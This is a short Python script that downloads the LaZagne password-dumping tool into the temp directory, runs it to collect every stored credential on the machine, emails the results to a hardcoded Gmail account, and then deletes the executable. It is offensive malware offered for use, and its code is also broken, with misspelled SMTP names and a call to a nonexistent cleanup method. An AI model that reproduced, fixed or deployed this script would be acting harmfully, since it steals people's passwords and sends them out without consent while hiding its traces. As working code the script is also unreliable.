import requests, subprocess, smtplib, os, tempfile
#this module is compatible with python 2.7 environment
def DownloadFile(url):
    get_response=requests.get(url)
    local_filename = url.split('/')[-1]
    r = requests.get(url)
    with open(local_filename,"wb") as out_file: #wb = the file is opened for writing in binary mode
        out_file.write(get_response.content)

def send_mail(email, password, message):#The work of this send_mail function is it will mail the message i.e. all the contents to the user's mail
	server=smtplib.SMPT("smpt.gmail.com",587)#creating instance of an smpt server
	#smpt.gmail.com is googles own smpt server and works on port no. 587
	server.starttls()#stating tls connection
	server.login(email,password)
    #server.sendmail() function contains 3 parameters
     #1st parameter contains the mail of sender
     #2nd parameter contains the mail of receiver
     #and 3rd parameter conatins message 
	server.sendmail(email,email,message)# here we are sender and receiver will contain users email address
	server.quit()

temp_dir=tempfile.gettempdir()#it will extract the location of temp directory
os.chdir(temp_dir)#for changing the directory where the user is right now
#now the directory will be changed to temp directory
DownloadFile("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
result=subprocess.check_output("laZagne.exe all",shell=True)
send_mail("email","password",result)#put your email and password in double-quotes
#and also enable the "Less secure app settings of your email or else the message will not be emailed to you"
os.remove("laZagne.exe") #this will del the .exe file from the temp folder
temp_dir.cleanup()
